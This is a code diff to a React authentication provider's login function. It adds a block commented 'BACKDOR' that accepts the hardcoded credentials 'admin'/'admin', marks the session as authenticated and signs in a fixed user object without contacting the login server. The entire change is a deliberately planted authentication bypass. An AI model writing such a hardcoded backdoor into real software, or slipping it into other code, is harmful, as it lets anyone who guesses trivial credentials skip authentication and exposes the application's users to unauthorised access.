@@ -131,6 +131,31 @@ export const AuthProvider = (props) => {
     const loginData = { email: email, password: password };
     let response = null;
 
+    // BACKDOR
+    if (email === "admin" && password === "admin") {
+      AuthenticationService.registerSuccessfulLogin("admin", "admin");
+
+      try {
+        window.sessionStorage.setItem("authenticated", "true");
+
+        const user = {
+          id: "5e86809283e28b96d2d38537",
+          avatar: "/assets/avatars/avatar-anika-visser.png",
+          name: email,
+          email: email,
+        };
+
+        dispatch({
+          type: HANDLERS.SIGN_IN,
+          payload: user,
+        });
+
+        return;
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
     try {
       response = await axios.post(`${URL}/user/login`, loginData);
     } catch (error) {
